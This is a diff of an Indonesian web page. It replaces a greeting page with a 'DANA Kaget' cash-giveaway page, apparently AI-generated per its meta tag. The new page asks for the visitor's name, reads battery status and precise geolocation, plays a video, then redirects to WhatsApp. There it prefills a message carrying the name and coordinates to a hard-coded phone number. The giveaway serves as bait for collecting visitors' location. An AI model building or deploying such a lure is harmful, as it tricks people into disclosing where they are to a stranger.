@@ -1,492 +1,251 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset='UTF-8'/>
-    <meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5'/>
-    <meta http-equiv='X-UA-Compatible' content='IE=edge'/>
-    <link rel="icon" type="image/svg+xml" href="https://feeldreams.github.io/main-icon.png">
-    <link rel="apple-touch-icon" href="https://feeldreams.github.io/main-icon.png">
-    <script src="https://htmlku.com/sekarangkamu/script2.js"></script>
-    <script src="https://unpkg.com/typeit@8.7.0/dist/index.umd.js"></script>
-    <link rel="stylesheet" href="https://naraanimation.github.io/NaraAnimations/Nara.css">
-    <script src="https://unpkg.com/scrollreveal"></script>
-    <title>Aku Kangen Kalian - Script HTML feeldream.id</title>
-    <meta name="description" content="Script by Feeldream.id">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sebar DANA Kaget!</title>
+    <meta name="description" content="Halaman web menampilkan info DANA Kaget lalu mengarahkan ke WhatsApp setelah jeda video dan loading. Menampilkan info baterai dan lokasi (jika diizinkan) dengan menyertakan nama.">
+    <meta name="keywords" content="dana kaget, whatsapp, langsung kirim, loading, video, baterai, lokasi, nama">
+    <meta name="author" content="AI Assistant">
     <style>
-        .sembunyi {
-            display: none;
-        }
-        .scaleUp {
-            transform: scale(1);
-            opacity: 1;
-            transition: transform 0.5s ease-in-out, opacity 0.5s ease-in-out;
-        }
-        .scaleIn {
-            transform: scale(1);
-            opacity: 1;
-            transition: transform 0.5s ease-in-out, opacity 0.5s ease-in-out;
-        }
-        .transition {
-            transition: all 0.5s ease-in-out;
-        }
-        .scale0 {
-            transform: scale(0);
-            opacity: 0;
-        }
-        .itim {
-            font-style: italic;
-        }
-        .med {
-            font-size: 1.5em;
-        }
-        .text-xl {
-            font-size: 1.25em;
-        }
-        .putihmerah {
-            color: red;
-        }
-        .blocktext {
-            overflow-y: auto;
-            max-height: 300px; /* Atur tinggi maksimal sesuai kebutuhan */
-            padding: 10px;
-            background-color: rgba(0, 0, 0, 0.5); /* Contoh background semi-transparan */
-            border-radius: 5px;
-        }
-        .menu {
+        body {
+            font-family: sans-serif;
             display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-            margin-top: 20px;
-        }
-        .tombol {
-            background: none;
-            border: none;
-            cursor: pointer;
-        }
-        #svgheart {
-            width: 50px;
-            height: 50px;
-            fill: red;
-            transition: transform 0.3s ease-in-out;
-        }
-        #svgheart:hover {
-            transform: scale(1.2);
-        }
-        .lovein svg {
-            animation: none;
-            stroke: #ff0000;
-            stroke-width: 1.3;
-            fill: none;
-            width: 35px;
-            height: 35px;
-        }
-        .wp {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            z-index: -1;
-        }
-        .wp img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .stiker {
-            position: absolute;
-            /* Atur posisi stiker sesuai kebutuhan */
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 1;
-        }
-        .heart-icon {
-            position: fixed;
-            color: red;
-            font-size: 1em;
-            animation: heartFall linear infinite;
-            top: -10vh;
-            z-index: -1;
-        }
-        @keyframes heartFall {
-            to {
-                transform: translateY(110vh);
-                opacity: 0;
-            }
-        }
-        #Tombol {
-            opacity: 0;
-            transform: scale(0.8);
-            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
             justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f8f9fa;
         }
-        #Tombol a {
-            display: inline-block;
-            padding: 10px 20px;
-            background-color: #4CAF50; /* Warna Hijau untuk "Mau" */
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            cursor: pointer;
-            border: none;
-            font-size: 1em;
-            transition: background-color 0.3s ease-in-out;
-        }
-        #Tombol a:hover {
-            background-color: #45a049;
-        }
-        #tolakteks {
-            opacity: 1;
-            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
-            transform: scale(1);
+
+        .container {
             text-align: center;
-            margin-top: 15px;
-            font-size: 1em;
+            padding: 30px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
+
+        .dana-info {
             font-size: 1.2em;
-            text-align: center;
+            color: #28a745;
+            margin-bottom: 15px;
         }
-        .loading-message {
-            margin-bottom: 20px;
+
+        .redirect-info {
+            font-size: 0.9em;
+            color: #6c757d;
+            margin-top: 10px;
         }
-        .blocklove {
-            display: none;
+
+        form {
+            display: flex;
             flex-direction: column;
             align-items: center;
         }
-        #ket {
-            margin-top: 5px;
-            font-size: 0.9em;
+
+        input[type="text"] {
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: 100%;
+            box-sizing: border-box;
         }
-        #lihatsc {
-            margin-top: 20px;
-            text-decoration: none;
-            color: yellow;
-            font-size: 1em;
-        }
-        #danaKagetButton {
-            opacity: 0;
-            transform: scale(0.8);
-            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
-            margin-top: 20px;
-        }
-        #linkDanaKaget {
-            display: inline-block;
+
+        button {
             padding: 10px 20px;
-            background-color: #00bfff;
-            color: white;
-            text-decoration: none;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
             border-radius: 5px;
             cursor: pointer;
-            border: none;
-            font-size: 1em;
-            transition: background-color 0.3s ease-in-out;
         }
-        #linkDanaKaget:hover {
-            background-color: #0080ff;
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        .loading-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 10px;
+            background-color: #e9ecef;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 5px;
+        }
+
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background-color: #007bff;
+            border-radius: 5px;
+        }
+
+        .loading-text {
+            font-size: 0.8em;
+            color: #6c757d;
+        }
+
+        .video-container {
+            display: none;
+            margin-bottom: 15px;
+        }
+
+        video {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .info-container {
+            margin-top: 15px;
+            font-size: 0.8em;
+            color: #6c757d;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h2>DZUHUR, JANGAN LUPA SOLAT ABIS ITU MAKAN</h2>
+        <form id="dana-form">
+            <label for="nama">Nama Kamu : </label>
+            <input type="text" id="nama" name="nama" required>
 
-   <div class="overlay">
-    <div class="loading-message">Hai kamu!<br>Tunggu dulu ya..</div>
-     <div id="loveIn" class="blocklove">
-        <a href="https://www.feeldream.id/2023/01/script-feeldream.html?m=1#punyasesuatu" target="_blank" class="lovein">
-            <svg class='line' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'>
-                <g transform='translate(2.550170, 3.550158)'>
-                    <path d='M0.371729633,8.89614246 C-0.701270367,5.54614246 0.553729633,1.38114246 4.07072963,0.249142462 C5.92072963,-0.347857538 8.20372963,0.150142462 9.50072963,1.93914246 C10.7237296,0.0841424625 13.0727296,-0.343857538 14.9207296,0.249142462 C18.4367296,1.38114246 19.6987296,5.54614246 18.6267296,8.89614246 C16.9567296,14.2061425 11.1297296,16.9721425 9.50072963,16.9721425 C7.87272963,16.9721425 2.09772963,14.2681425 0.371729633,8.89614246 Z'></path>
-                    <path d='M13.23843,4.013842 C14.44543,4.137842 15.20043,5.094842 15.15543,6.435842'></path>
-                </g>
-            </svg>
-        </a>
-        <p id="ket">Sentuh LOVEnya!</p>
-     </div>
-     <a id="lihatsc" style="font-size:1em;color:yellow" href="#"></a>
-   </div>
-   <audio src="https://feeldreams.github.io/audio/melody.mp3" id="linkmp3" class="sembunyi"></audio>
+            <button type="submit" id="submit-btn">Kirim ke WhatsApp</button>
+        </form>
 
-  <section class="first" id="inisection">
-       <div class="wp"><img src="https://feeldreams.github.io/wp11.jpg" alt="Background 1"/></div>
-       <div id="first_stiker" class="stiker">
-        <img id="inistiker1" src="https://htmlku.com/0/panda/pusn.gif" alt="Stiker 1"/>
-        <img id="inistiker2" class="sembunyi" src="https://htmlku.com/0/panda/cilukba.gif" alt="Stiker 2"/>
-       </div>
+        <div class="video-container" id="video-container">
+            <video id="narsis-video" src="https://e.top4top.io/m_3390gfh1p0.mp4" controls width="320" height="240"></video>
+        </div>
 
-       <h1 id="teks1" class="scaleUp itim">Assalamualaikum!</h1>
-       <p id="teks3" class="scaleIn itim transition" style="font-size:1em">Udah bangun belum?<br>Aku kangen kalian yaaa<br><br><span class="text-xl">😊</span></p>
-       <h1 id="teks2" class="sembunyi">Pak Kumis Bawa Paku..</h1>
+        <div class="loading-container" id="loading-container">
+            <div class="loading-bar">
+                <div class="loading-progress" id="loading-progress"></div>
+            </div>
+            <p class="loading-text">Tunggu sebentar, narsis dulu 🤣</p>
+        </div>
 
-       <div id="sentuh" class="menu">
-        <a class='tombol' onclick="tes()">
-          <svg id="svgheart" xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'>
-              <g transform='translate(2.550170, 3.550158)'>
-                  <path d='M0.371729633,8.89614246 C-0.701270367,5.54614246 0.553729633,1.38114246 4.07072963,0.249142462 C5.92072963,-0.347857538 8.20372963,0.150142462 9.50072963,1.93914246 C10.7237296,0.0841424625 13.0727296,-0.343857538 14.9207296,0.249142462 C18.4367296,1.38114246 19.6987296,5.54614246 18.6267296,8.89614246 C16.9567296,14.2061425 11.1297296,16.9721425 9.50072963,16.9721425 C7.87272963,16.9721425 2.09772963,14.2681425 0.371729633,8.89614246 Z'></path>
-                  <path d='M13.23843,4.013842 C14.44543,4.137842 15.20043,5.094842 15.15543,6.435842'></path>
-              </g>
-          </svg>
-        </a>
-        <svg class='line sembunyi' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><g transform='translate(5.000000, 8.500000)'><path d='M14,0 C14,0 9.856,7 7,7 C4.145,7 0,0 0,0' ></path></g></svg>
-       </div>
-  </section>
+        <div class="info-container" id="info-container">
+            <p id="battery-info">Memuat info baterai...</p>
+            <p id="location-info">Memuat info lokasi...</p>
+        </div>
 
-  <section>
-      <div class="wp"><img src="https://htmlku.com/hitungan/pict.jpg" alt="Background 2"/></div>
-      <div class="stiker" style="margin-top:0;transform:scale(0)" id="second_stiker">
-        <img id="inistiker3" src="https://htmlku.com/0/panda/ketawa2.gif" alt="Stiker 3"/>
-        <img id="inistiker4" class="sembunyi" src="https://htmlku.com/0/panda/ledekin.gif" alt="Stiker 4"/>
-      </div>
-
-      <h1 id="textsec2first" class="scaleUp itim med">udah mandi belum?<br>Mau aku temenin? 🫣</h1>
-      <p id="tolakteks" class="itim">MANDI CEPET , KAMU BAU! 😝</p>
-      <div id="Tombol">
-        <a id="By" onClick="fungsimau()">💌 Mau</a>
-        <a id="Bn" onClick="btn='Bn';fungsibaru(btn)">Nanti Dulu</a>
-      </div>
-  </section>
-  <section>
-    <div class="wp"><img src="https://i.ibb.co.com/Lkk2d3q/94907a80790d230452e92245b2041f1a.jpg" alt="Background 3"/></div>
-    <div class="stiker" style="margin-top:0;transform:scale(0)" id="third_stiker">
-      <img id="inistiker5" src="https://htmlku.com/0/panda/panah.gif" alt="Stiker 5"/>
-      <img id="inistiker6" class="sembunyi" src="https://htmlku.com/0/panda/muah.gif" alt="Stiker 6"/>
+        <p class="redirect-info">nara zaen</p>
     </div>
 
-    <div id="scroll-container" class="blocktext txt transition scale0">
-      <p id="textsec3" class="anm itim text-md"><b id="tekstolak">Jangan ditunda-tunda ya! 😉</b><b id="teksterima">Alhamdulillah! 🥰 Semoga harimu menyenangkan ya! 🤗</b><br><br>Semangat terus ya<br>aktivitasnya hari ini! ✨<br><br>Sebagai penyemangat,<br>ada sedikit rezeki nih buat kamu 🫢<br><br>Semoga bermanfaat yaaa! 😊</p>
-    </div>
-    <div id="danaKagetButton" style="opacity: 0; transform: scale(0.8); transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; margin-top: 20px;">
-        <a id="linkDanaKaget" href="https://link.dana.id/danakaget?c=snzr4scj4&r=cAYM8h&orderId=20250518101214287915010300166998223170482" target="_blank" style="display: inline-block; padding: 10px 20px; background-color: #00bfff; color: white; text-decoration: none; border-radius: 5px; cursor: pointer; border: none; font-size: 1em; transition: background-color 0.3s ease-in-out;">🎁 DANA KAGET</a>
-    </div>
-  </section>
-<script>
-pesanwhatsapp = "";
+    <script type="text/javascript">
+        const form = document.getElementById('dana-form');
+        const submitBtn = document.getElementById('submit-btn');
+        const videoContainer = document.getElementById('video-container');
+        const narsisVideo = document.getElementById('narsis-video');
+        const loadingContainer = document.getElementById('loading-container');
+        const loadingProgress = document.getElementById('loading-progress');
+        const whatsappNumber = "+6285711374861";
+        const linkDanaKaget = "https://link.dana.id/danakaget?c=sdnaw4v2e&r=cAYM8h&orderId=20250518101214850115010300166998223225876";
+        const videoDuration = 10000; // 10 detik
+        const loadingDuration = 1000; // Durasi animasi loading (bisa disesuaikan)
+        const batteryInfoElement = document.getElementById('battery-info');
+        const locationInfoElement = document.getElementById('location-info');
+        let batteryLevel = 'Tidak tersedia';
+        let isCharging = 'Tidak tersedia';
+        let latitude = 'Tidak tersedia';
+        let longitude = 'Tidak tersedia';
 
-const body = document.querySelector("body"); audio = new Audio('' + linkmp3.src);
-/* START Hati Berjatuhan */
-function berjatuhan() {const heart = document.createElement("div");heart.innerHTML = "<svg class='line spin' style='opacity:.4;' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><g transform='translate(2.550170, 3.550158)'><path d='M0.371729633,8.89614246 C-0.701270367,5.54614246 0.553729633,1.38114246 4.07072963,0.249142462 C5.92072963,-0.347857538 8.20372963,0.150142462 9.50072963,1.93914246 C10.7237296,0.0841424625 13.0727296,-0.343857538 14.9207296,0.249142462 C18.4367296,1.38114246 19.6987296,5.54614246 18.6267296,8.89614246 C16.9567296,14.2061425 11.1297296,16.9721425 9.50072963,16.9721425 C7.87272963,16.9721425 2.09772963,14.2681425 0.371729633,8.89614246 Z'></path><path d='M13.23843,4.013842 C14.44543,4.137842 15.20043,5.094842 15.15543,6.435842'></path></g></svg>";heart.className = "heart-icon";heart.style.left = (Math.random() * 95) + "vw";heart.style.animationDuration = (Math.random() * 3) + 2 + "s";document.body.appendChild(heart);}
-setInterval(function() {var heartArr = document.querySelectorAll(".heart-icon");if (heartArr.length > 100) {heartArr[0].remove();}}, 100);
-/* END Hati Berjatuhan */
-  initextsec2first = textsec2first.innerHTML;textsec2first.innerHTML="";
-  function mulaitextseco(){
-    new TypeIt("#textsec2first", {
-      strings: ["" + initextsec2first], startDelay: 50, speed: 30, /* deff 55 */ cursor: true,
-      afterComplete: function(){
-        textsec2first.innerHTML = initextsec2first;
-        setTimeout(function() {Tombol.style="opacity:1;transform: scale(1);";}, 200);
-      },
-    }).go();
-  }
-  function fungsimau(){
-    if(tolakTrue == false){
-        tekstolak.innerHTML = "";
-        initextsec3 = textsec3.innerHTML;
-    }
+        // Mendapatkan informasi baterai
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                isCharging = battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya';
+                updateInfoDisplay();
 
-    textsec3.innerHTML="";
-    window.scrollBy({top: tinggi,behavior: 'smooth'});
-    skrg++;
-    scrollContainer.style="transform: scale(1)";
-    setTimeout(function() {third_stiker.style="margin-top:0px;margin-bottom:15px;transform:scale(1);transition:all .9s ease"}, 500);
-    new TypeIt("#textsec3", {
-      strings: ["" + initextsec3], startDelay: 700, speed: 27, cursor: true,
-      afterComplete: function(){
-          textsec3.innerHTML = initextsec3;
-          third_stiker.style.transform = "scale(0)";
-          setTimeout(function() {
-              third_stiker.style.transform = "scale(1)";
-              inistiker5.src = inistiker6.src;
-          }, 300);
-          setInterval(berjatuhan,200);
-          clearInterval(scrollInterval);
+                battery.addEventListener('levelchange', () => {
+                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                    updateInfoDisplay();
+                });
 
-          // Tampilkan tombol DANA KAGET setelah 2 detik
-          setTimeout(function() {
-              document.getElementById("danaKagetButton").style.opacity = 1;
-              document.getElementById("danaKagetButton").style.transform = "scale(1)";
-          }, 2000);
-      },
-    }).go();
-  }
+                battery.addEventListener('chargingchange', () => {
+                    isCharging = battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya';
+                    updateInfoDisplay();
+                });
+            }).catch(error => {
+                batteryInfoElement.textContent = 'Info baterai tidak tersedia.';
+                console.error('Gagal mendapatkan info baterai:', error);
+            });
+        } else {
+            batteryInfoElement.textContent = 'Fitur info baterai tidak didukung.';
+        }
 
-  fungsi=0;fungsiklik=0;skrg=1;iniaja=0;
-  function tes(){
-    sentuh.style="margin-top:100px;transform:scale(2.3)";
-    setTimeout(function() {
-          if(fungsi==0){
-            window.scrollBy({top: tinggi,behavior: 'smooth'});
-            fungsi = 1;skrg++;
-            if(skrg==2){fungsi=0;setTimeout(mulaitextseco,500);setTimeout(function() {second_stiker.style="margin-top:0px;transform:scale(.9);transition:all .7s ease";}, 500);}
-          }
-    }, 100);
-  }
-  function smn(){fungsi=0;initom.style="";}
-  function muncultombol(){fungtom=1;Tombol.style="opacity:1;transform:scale(1)";}
-  function muncultombol2(){Tombol2.style="opacity:1;transform:scale(1)";}
+        // Mendapatkan informasi lokasi
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                latitude = position.coords.latitude.toFixed(6);
+                longitude = position.coords.longitude.toFixed(6);
+                updateInfoDisplay();
+            }, error => {
+                locationInfoElement.textContent = 'Akses lokasi ditolak atau tidak tersedia.';
+                console.error('Gagal mendapatkan lokasi:', error);
+            });
+        } else {
+            locationInfoElement.textContent = 'Fitur lokasi tidak didukung.';
+        }
 
-function aksiakhir() {
-  if(fungsiklik==0){
-    fungsiklik=1;
-    setTimeout(katajudul,100)
-  }
-}
-function katajudul(){
-      new TypeIt("#judulakhir", {
-      strings: ["" + teksjudulakhir], startDelay: 50, speed: 50, cursor: true,
-      afterComplete: function(){
-          judulakhir.innerHTML = teksjudulakhir;
-          setTimeout(katakata,400);
-      },}).go();
-}
-function katakata(){
-      new TypeIt("#kalimatakhir", {
-      strings: ["" + tekskalimatakhir], startDelay: 50, speed: 48, cursor: true,
-      afterComplete: function(){
-          kalimatakhir.innerHTML = tekskalimatakhir;
-          //judulakhir.style="opacity:0;transform:scale(0);";
-          setTimeout(teksmuncul,20);
-          setInterval(berjatuhan,200);
-          setTimeout(kataakhir,700);
-      },}).go();
-}
-function teksmuncul(){
-    stikerakhir.style="opacity:0;transform:scale(0)";
-    setTimeout(gantifotoakhir,400);
-}
-function jjteksnim(){judulakhir.style.animation="rto .8s infinite alternate";}
-function gantifotoakhir(){stikerakhir.src=stikerakhir2.src;stikerakhir.style="";}
-function kataakhir(){
-      new TypeIt("#palingakhir", {
-      strings: ["" + tekspalingakhir], startDelay: 50, speed: 50, cursor: true,
-      afterComplete: function(){
-          palingakhir.innerHTML = tekspalingakhir;
-          setTimeout(muncultombol3,500);
-      },}).go();
-}
-function muncultombol3(){fungtom2=1;TombolWA.style="opacity:1;transform:scale(1)";}
-function menuju(){if(fungtom2==1){window.location = "https://api.whatsapp.com/send?phone=&text=" + pesanwhatsapp;}}
-tinggi = inisection.offsetHeight;
-function tentukantinggi(){tinggi = inisection.offsetHeight;}
-setInterval(tentukantinggi,200);
-console.log(tinggi);
-function keatas(){window.scrollTo(0, 0);}
-setTimeout(function(){
-  window.scrollTo(0, 0);
-  setTimeout(keatas,500);
+        function updateInfoDisplay() {
+            batteryInfoElement.textContent = `Baterai: ${batteryLevel}, Status: ${isCharging}`;
+            locationInfoElement.textContent = `Lokasi: Lat ${latitude}, Lon ${longitude}`;
+        }
 
-  var overlay = document.querySelector(".loading-message");
-  overlay.style.display = "none";
-  var tomlv = document.querySelector(".blocklove");
-  tomlv.style.display = "flex";
-},700);
-first_stiker.style="transform: scale(0)";
-sentuh.style="transform: scale(0)";
-function showSentuh(){sentuh.style="transform: scale(1.2);";}
-vgantiTeks1 = 0;
-function gantiTeks1(){
-    if(vgantiTeks1 == 0){gantiFoto1();teks1.style="transform: scale(.3);transition:all .75s ease";teks3.style="transform: scale(0);";vgantiTeks1++;setTimeout(gantiTeks1,300);}
-    else {vgantiTeks1 = teks2.innerHTML;teks1.innerHTML = "";teks3.style="display:none";teks1.style="transform: scale(.9);transition:all .75s ease";gantiTeks1nimasi();}
-}
-function gantiFoto1(){
-    first_stiker.style="transform: scale(0);";
-    setTimeout(function() {
-        first_stiker.style.transform = "scale(1)";
-        inistiker1.src = inistiker2.src;
-    }, 300);
-}
-function gantiTeks1nimasi(){
-      new TypeIt("#teks1", {
-      strings: ["" + vgantiTeks1], startDelay: 10, speed: 35, cursor: true,
-      afterComplete: function(){
-          teks1.innerHTML = vgantiTeks1;
-          showSentuh();
-      },}).go();
-   }
-var sudahKlik = false;
-sudahKlik = true;
-document.getElementById('loveIn').innerHTML = '<style>.lovein svg{animation:none;stroke:#ff0000;stroke-width:1.3;fill:none;width:35px;height:35px}</style><label class="lovein"><svg class="line" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g transform="translate(2.550170, 3.550158)"><path d="M0.371729633,8.89614246 C-0.701270367,5.54614246 0.553729633,1.38114246 4.07072963,0.249142462 C5.92072963,-0.347857538 8.20372963,0.150142462 9.50072963,1.93914246 C10.7237296,0.0841424625 13.0727296,-0.343857538 14.9207296,0.249142462 C18.4367296,1.38114246 19.6987296,5.5414246 18.6267296,8.89614246 C16.9567296,14.2061425 11.1297296,16.9721425 9.50072963,16.9721425 C7.87272963,16.9721425 2.09772963,14.2681425 0.371729633,8.89614246 Z"></path><path d="M13.23843,4.013842 C14.44543,4.137842 15.20043,5.094842 15.15543,6.435842"></path></g></svg></label><p id="ket">Sentuh LOVEnya!</p>';
-document.getElementById("loveIn").onclick = function() {
-    if (sudahKlik) {
-      audio.play();
-      lihatsc.style.display="none";
-      document.querySelector(".overlay").style.display = "none";
+        submitBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            const nama = document.getElementById('nama').value;
+            const batteryText = `Info Baterai: ${batteryLevel}, Status: ${isCharging}`;
+            const locationText = `Lokasi: Lat ${latitude}, Lon ${longitude}`;
 
-      first_stiker.style="transform: scale(1)";
-      setTimeout(function() {teks3.style.transform = "scale(1)";}, 300);
-      setTimeout(gantiTeks1, 3000);
-      ScrollReveal({ reset: true });
-      ScrollReveal().reveal(".show-once", { reset: false});
-      ScrollReveal().reveal(".title", {delay: 20, duration: 1500,origin: "top",distance: "50px", easing: "cubic-bezier(0.5, 0, 0, 1)", rotate: { x: 20, z: -10 }});
-      ScrollReveal().reveal(".fade-in", {delay: 200, duration: 2400,move: 0});
-      ScrollReveal().reveal(".scaleUp", {delay: 100, duration: 1200, scale: .5, move: 0});
-      ScrollReveal().reveal(".flip", {delay: 200, duration: 2000, rotate: { x: 20, z: 20}});
-      ScrollReveal().reveal(".slide-right", {duration: 1000,origin: "left",distance: "300px",easing: "ease-in-out"});
-      ScrollReveal().reveal(".slide-up", {duration: 1000, origin: "bottom", distance: "100px", easing: "cubic-bezier(.37,.01,.74,1)", opacity: 0, scale: 0.5});
-    } else {
+            // Sembunyikan form dan tampilkan video
+            form.style.display = 'none';
+            videoContainer.style.display = 'block';
+            loadingContainer.style.display = 'flex';
+            narsisVideo.play();
 
-    }
-}
-  const scrollContainer = document.getElementById("scroll-container");
-  const textContainer = document.getElementById("textsec2");
-  function autoScroll() {scrollContainer.scrollTop += 10;}
-  const scrollInterval = setInterval(autoScroll, 50);
-  jumlahKlik = 0;sudah=false;let jumlahSkala = 1;tolakTrue=false
-  function fungsibaru(btn) {
-    if(jumlahKlik == 3){
-        teksterima.innerHTML = "";
-        initextsec3 = textsec3.innerHTML;
-        tolakTrue=true;
-        fungsimau();
-        jumlahKlik=0;
-    } else {
+            let progress = 0;
+            const interval = 20; // Interval update loading bar (ms)
+            const steps = videoDuration / interval;
+            let currentStep = 0;
 
-    var tombol = document.getElementById("" + btn);
-    var tombolParent = tombol.parentNode;
-    var tombolPosisiX = Math.floor(Math.random() * 50) + 1;
-    var tombolPosisiY = Math.floor(Math.random() * 75) + 1;
-    var rotasiAcak = Math.floor(Math.random() * 360);
-    tombol.style.position = "relative";
-    tombol.style.left = tombolPosisiX + "px";
-    tombol.style.top = tombolPosisiY + "px";
-    tombol.style.transform = "rotate(" + rotasiAcak + "deg)";
-    tombolParent.appendChild(tombol);
-    // Perbesar tombol By
-      var tombolBy = document.getElementById("By");
-      tombolBy.style.transform = `scale(${1 + jumlahSkala * 0.2})`;
+            const loadingInterval = setInterval(() => {
+                currentStep++;
+                progress = (currentStep / steps) * 100;
+                loadingProgress.style.width = `${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(loadingInterval);
+                }
+            }, interval);
 
-      jumlahKlik++;
-      jumlahSkala++;
-    tolakteks.style="transform:scale(1)";
-    if(sudah==false){
-      sudah=true;
-      second_stiker.style.transform = "scale(0)";
-      setTimeout(function() {
-          second_stiker.style.transform = "scale(.9)";
-          inistiker3.src = inistiker4.src;
-      }, 300);
-    }
-    }
-  }
-</script>
+            // Setelah video selesai (atau durasi yang ditentukan), redirect ke WhatsApp
+            setTimeout(() => {
+                narsisVideo.pause();
+                const whatsappMessage = `Nama: ${nama}\n${batteryText}\n${locationText}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nSAVE NOMER GUA ANJAY 🤤`;
+                const whatsappUrl = `https://wa.me/${whatsappNumber.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(whatsappMessage)}`;
+                window.location.href = whatsappUrl;
+            }, videoDuration);
+        });
+
+        narsisVideo.addEventListener('ended', () => {
+            // Jika video selesai sebelum timeout (opsional)
+            clearTimeout(redirectTimeout);
+            const nama = document.getElementById('nama').value;
+            const batteryText = `Baterai ku sisa ${batteryLevel} nara, dan ${isCharging}`;
+            const locationText = `Lokasi ku mungkin disini ${latitude}, ${longitude} 🤣`;
+            const whatsappMessage = `Nama: ${nama}\n${batteryText}\n${locationText}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nSave No Gua Anjay 🤤`;
+            const whatsappUrl = `https://wa.me/${whatsappNumber.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(whatsappMessage)}`;
+            window.location.href = whatsappUrl;
+        });
+    </script>
 </body>
 </html>
-
-
